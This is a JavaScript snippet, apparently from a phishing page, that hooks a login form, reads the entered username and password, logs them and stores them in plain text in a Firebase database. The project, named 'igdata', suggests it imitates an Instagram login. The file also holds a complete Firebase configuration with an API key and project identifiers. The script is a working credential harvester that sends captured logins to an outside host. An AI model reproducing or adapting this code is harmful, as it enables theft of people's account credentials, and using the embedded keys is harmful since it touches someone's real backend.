   // Firebase configuration
   const firebaseConfig = {
    apiKey: "AIzaSyCbee8ApzTaLWtz-zq10g2s6EI3haCJd3g",
    authDomain: "igdata-be73d.firebaseapp.com",
    databaseURL: "https://igdata-be73d-default-rtdb.firebaseio.com",
    projectId: "igdata-be73d",
    storageBucket: "igdata-be73d.appspot.com",
    messagingSenderId: "170738800426",
    appId: "1:170738800426:web:fc3e8a2a49dcacec61f053",
    measurementId: "G-QEZEZ3H3QZ"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);

  var formData = firebase.database().ref('container');

  document.getElementById('container').addEventListener('submit', loginFun);

  function loginFun(e) {
    e.preventDefault();
    var username = getElementVal("username");
    var password = getElementVal("pass");
    console.log(username, password);
    saveresponse(username, password);
  }

  const saveresponse = (username, password) => {
    var newForm = formData.push();
    newForm.set({
      name: username,
      pass: password
    });
  };

  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };